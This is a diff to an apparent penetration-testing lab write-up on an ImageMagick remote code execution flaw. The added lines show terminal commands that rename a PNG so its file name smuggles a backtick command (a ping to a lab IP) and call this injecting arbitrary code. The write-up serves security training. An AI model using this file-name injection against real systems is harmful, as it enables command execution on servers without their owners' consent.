@@ -30,6 +30,15 @@ uploaded an image file and we can see the version of this service running is `6.
 
 ![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/a21b78b9-40e7-46f7-b753-121e9aeec290)
 
-searching for exploit on this service, we can see there's an RCE vuln present [exploit](https://github.com/ImageMagick/ImageMagick/issues/6339)
+searching for exploit on this service, we can see there's an RCE vuln present read about [exploit](https://github.com/ImageMagick/ImageMagick/issues/6339). 
+
+```shell
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/Image]
+└─$ cp ~/Pictures/1.png .
+                                                                                                                                                            
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/Image]
+└─$ cp 1.png '|1"`ping 192.168.45.212`".png'
+```
+modify the name of an image and inject an arbitary code to it. 
 
 
